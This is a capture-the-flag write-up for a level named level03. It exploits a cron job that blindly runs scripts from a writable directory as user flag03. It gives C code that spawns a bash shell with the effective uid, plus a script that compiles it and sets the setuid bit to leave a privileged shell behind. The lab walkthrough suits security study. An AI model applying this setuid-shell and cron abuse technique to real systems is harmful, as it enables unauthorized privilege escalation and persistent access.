## level03

The vulnerability exist because the crontab executes the script blindly without verifying the files.

Since it runs as user <b>flag03</b> we can put there a file (a C program that spawn a shell for example) and it will execute it.

```
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    gid_t gid = getegid();
    uid_t uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/bin/bash");
}
```

Now that we have a program that spawns a shell we need to compile it.
To make it possible to the run it as <b>flag03</b>, we need to compile it through the crontab execution.

```
#!/bin/sh

gcc /tmp/shell.c -o /home/flag03/shell
chmod u+s /home/flag03/shell
```

Now just copy it to the <b>writable.d</b> folder and wait for the scheduller to execute it.

Once it executed just /home/flag03/shell and issue <b>getflag</b>

### Flag
```
You have successfully executed getflag on a target account 
```

